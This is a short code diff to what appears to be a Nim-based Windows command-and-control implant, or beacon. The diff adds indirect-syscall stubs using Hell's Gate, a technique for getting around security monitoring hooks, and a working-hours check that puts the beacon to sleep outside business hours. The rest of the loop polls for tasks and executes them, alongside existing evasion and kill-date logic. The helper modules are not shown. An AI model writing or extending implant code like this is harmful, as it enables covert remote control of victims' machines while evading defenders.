@@ -7,7 +7,7 @@
 
 import std/[os, times, strutils, random]
 import winim/lean
-import config, transport, commands, evasion
+import config, transport, commands, evasion, syscalls
 
 proc killDateCheck() =
   when KillDate != "":
@@ -27,6 +27,9 @@ proc main() =
   when not defined(noEvasion):
     applyEvasion()
 
+  # Indirect syscall stubs (Hell's Gate SSN resolution)
+  initSyscalls()
+
   # Init transport
   var t = newTransport()
 
@@ -38,6 +41,9 @@ proc main() =
   # Beacon loop
   while true:
     killDateCheck()
+    if not inWorkingHours():
+      sleepUntilWorkHours()
+      continue
     try:
       let tasks = t.beacon()
       for task in tasks:
